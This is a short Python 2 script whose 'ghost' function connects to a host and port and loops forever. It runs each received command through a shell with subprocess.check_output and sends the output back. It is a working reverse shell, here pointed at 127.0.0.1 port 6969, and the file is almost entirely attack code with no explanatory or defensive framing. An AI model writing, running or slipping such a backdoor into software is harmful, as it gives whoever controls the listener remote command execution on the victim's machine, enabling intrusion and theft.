import os
import sys
import subprocess
import socket
from socket import *
from subprocess import *



def ghost(host, port):
    sock = socket(AF_INET, SOCK_STREAM) #Also (2,1)
    try:
        sock.connect((host, int(port)))
        print 'Connection Established.'
        try:
            while True:
                ghost_data = sock.recv(0x800)
                ghost_shell = subprocess.check_output(ghost_data, shell=True)
                sock.sendall(ghost_shell)
            sock.close()
        except Exception as sendingdata:
            print 'Error between Func ghost() + main .\n More: %s' % sendingdata
    except Exception as FunctionError:
        print 'Error in Func ghost()\n More: %s' % FunctionError


ghost('127.0.0.1', 6969)